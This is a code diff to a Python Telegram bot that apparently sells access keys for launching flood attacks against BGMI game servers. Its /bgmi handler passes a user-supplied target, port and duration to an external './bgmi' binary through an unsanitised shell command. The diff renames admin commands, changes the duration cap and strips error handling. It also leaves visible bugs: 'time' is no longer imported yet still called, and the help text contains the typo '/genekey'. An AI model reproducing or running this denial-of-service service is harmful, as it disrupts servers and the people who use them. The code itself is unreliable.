@@ -5,7 +5,6 @@ import os
 import random
 import string
 import json
-import time
 
 from keep_alive import keep_alive
 keep_alive()
@@ -97,7 +96,7 @@ def generate_key(length=6):
 def add_time_to_current_date(hours=0, days=0):
     return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
 
-@bot.message_handler(commands=['gen'])
+@bot.message_handler(commands=['genkey'])
 def generate_key_command(message):
     user_id = str(message.chat.id)
     if user_id in admin_id:
@@ -119,7 +118,7 @@ def generate_key_command(message):
             except ValueError:
                 response = "Please specify a valid number and unit of time (hours/days)."
         else:
-            response = "Usage: /gen <amount> <hours/days>"
+            response = "Usage: /genkey <amount> <hours/days>"
     else:
         response = "🫅ONLY OWNER CAN USE🫅"
 
@@ -157,7 +156,7 @@ def handle_bgmi(message):
     if user_id in users:
         expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
         if datetime.datetime.now() > expiration_date:
-            response = "❌ Access Chala Gaya Dost. Naya Key Redeem Karle-> using /redeem <key> ❌"
+            response = "❌ Access Chala Gaya Dost. Naya Key Redeem Karle-> using /redeemkey <key> ❌"
             bot.reply_to(message, response)
             return
         
@@ -188,19 +187,14 @@ def handle_bgmi(message):
             try:
                 port = int(command[2])
                 time = int(command[3])
-                if time > 190:
-                    response = "⚠️Error: Time interval must be less than 190 seconds."
+                if time > 160:
+                    response = "⚠️Error: Time interval must be less than 160 seconds."
                 else:
                     record_command_logs(user_id, '/bgmi', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
                     full_command = f"./bgmi {target} {port} {time} 320"
-                    try:
-                        subprocess.run(full_command, shell=True, check=True)
-                    except subprocess.CalledProcessError as e:
-                        response = f"Error running subprocess: {str(e)}"
-                        bot.reply_to(message, response)
-                        return
+                    subprocess.run(full_command, shell=True)
                     response = f"🎮BGMI FUCKED🎮\nTarget: {target}\nPort: {port}\nTime: {time} Seconds"
             except ValueError:
                 response = "Error: Port and time must be integers."
@@ -298,7 +292,7 @@ def show_help(message):
 💥 /redeem <key>: Redeem a key for access.
 
 🤖 Admin commands:
-💥 /gen <amount> <hours/days>: Generate a new key.
+💥 /genekey <amount> <hours/days>: Generate a new key.
 💥 /allusers: List authorized users.
 💥 /logs: Show all users' logs.
 💥 /clearlogs: Clear the logs file.
@@ -348,7 +342,7 @@ def admin_commands(message):
     user_name = message.from_user.first_name
     response = f'''{user_name}, here are the admin commands:
 
-💥 /gen <amount> <hours/days>: Generate a new key.
+💥 /genkey <amount> <hours/days>: Generate a new key.
 💥 /allusers: List authorized users.
 💥 /logs: Show all users' logs.
 💥 /clearlogs: Clear the logs file.
@@ -402,6 +396,6 @@ if __name__ == "__main__":
         try:
             bot.polling(none_stop=True)
         except Exception as e:
-            print(f"Exception occurred: {str(e)}")
-            # Wait a bit before restarting the polling to avoid tight loop in case of persistent errors
+            print(e)
+            # Add a small delay to avoid rapid looping in case of persistent errors
             time.sleep(15)
